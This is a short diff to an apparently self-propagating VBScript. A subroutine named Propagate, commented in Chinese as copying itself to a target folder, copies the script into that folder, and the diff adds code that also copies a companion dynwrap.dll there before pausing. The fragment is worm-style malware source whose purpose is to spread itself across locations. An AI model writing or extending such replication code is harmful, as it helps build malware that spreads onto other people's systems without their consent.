@@ -16,5 +16,12 @@ Sub Propagate(targetPath) '复制自身到指定文件夹
 	If objFileSystem.FileExists(targetPath & sourceName) = False Then
 		objFileSystem.CopyFile sourcePath, targetPath, False
 	End If
+	
+	Const dllName = "dynwrap.dll"
+	dllPath = Replace(sourcePath, sourceName, dllName)
+	If objFileSystem.FileExists(targetPath & dllName) = False And objFileSystem.FileExists(dllPath)  Then
+		objFileSystem.CopyFile dllPath, targetPath, False
+	End If
+	WScript.Sleep 5000
 	Set objFileSystem = Nothing
 End Sub
